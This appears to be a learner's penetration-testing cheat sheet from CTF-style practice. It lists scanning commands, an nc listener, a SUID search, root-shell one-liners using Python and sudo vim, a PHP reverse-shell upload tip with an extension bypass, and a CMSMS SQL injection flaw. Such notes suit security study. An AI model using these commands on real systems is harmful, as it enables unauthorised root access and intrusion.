
[[Linux Commands|List of Linux Commands]]

nmap -sV <ip> (port scanning)

find . -type f -name "file name" (finding text files)

nikto -h <ip> (checking webpages on a http 80 port)

cp <original file location> <new file name> (copy and paste file to current location)

nc -lvnp <port> (opens up a listener to the port)

find / -user root -perm /4000 -type f 2>/dev/null        (finds files with broken privileges ????)     [This command searches for SUID binaries owned by root that have the SUID permission set. The output is filtered to ignore permission errors.]

/usr/bin/python -c 'import os,pty; os.setuid(0); pty.spawn("/bin/bash")'      (privilege escalation using python????)      [1. This command uses the SUID Python binary to spawn a root shell by setting the effective user ID to 0 (root) and starting an interactive shell.]

reverse shell scrip location: **/usr/share/webshells/php/php-reverse-shell.php**
- rename ip to host machine ip (your ip)
- name port to port you want to listen to
- if can't upload php, rename extension to php5 


Research
Nmap
Gobuster

gobuster dir -u <link> -w <wordlist>
 -u flag for link
 -w flag for wordlist

ssh <user>@<ip> -p <port>
- eg ssh mitch@10.49.188.15 -p 2222
- gives ssh access into machine using username and password

sudo -l
- shows what commands can be run with sudo

sudo vim -c ':!/bin/sh'
sudo vim 
	:!bash
- privilege escalation using VIM if user has sudo vim access

CVE-2019-9053
CVE-2019-9053 is a Time-Based Blind SQLi vulnerability which enables the attacker to enumerate the database extracting information by monitoring delays in the responses of the application. The vulnerability is present in versions of CMSMS equal to or below 2.2.9.


